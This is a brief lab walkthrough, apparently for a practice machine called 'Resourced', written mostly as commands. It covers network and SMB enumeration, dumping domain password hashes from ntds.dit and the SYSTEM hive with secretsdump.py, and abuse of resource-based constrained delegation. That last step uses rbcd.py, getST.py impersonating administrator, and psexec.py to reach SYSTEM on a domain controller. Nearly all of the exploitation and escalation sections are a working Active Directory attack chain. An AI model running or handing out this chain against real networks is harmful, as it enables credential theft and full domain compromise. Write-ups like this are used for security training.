# Resourced
> ntds.dit + SYSTEM + RBCD

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
enum4linux-ng -A <IP>
```

SMB share accessible with found credentials.

## Exploitation

`ntds.dit` dump via SMB or exposed service:

```
secretsdump.py <user>:<pass>@<IP>
```

Hashes extracted from `ntds.dit` and `SYSTEM` file.

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Privilege Escalation

Resource-Based Constrained Delegation (RBCD):

```
rbcd.py -f ATTACKER$ -t DC$ -dc-ip <IP> <domain>/<user>:<pass>
getST.py -spn cifs/<DC>.<domain> -impersonate administrator -dc-ip <IP> <domain>/ATTACKER$:<pass>
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass <DC>.<domain>
```

SYSTEM on Domain Controller obtained.
